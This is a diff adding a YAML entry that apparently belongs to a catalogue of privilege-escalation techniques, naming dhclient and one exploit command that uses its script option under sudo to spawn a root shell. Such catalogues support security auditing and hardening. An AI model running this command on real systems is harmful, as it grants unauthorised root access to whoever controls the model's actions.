@@ -1,0 +1,4 @@
+name: dhclient
+binary_path: /usr/bin/dhclient
+exploit_cmds:
+- sudo /usr/bin/dhclient -sf /bin/sh
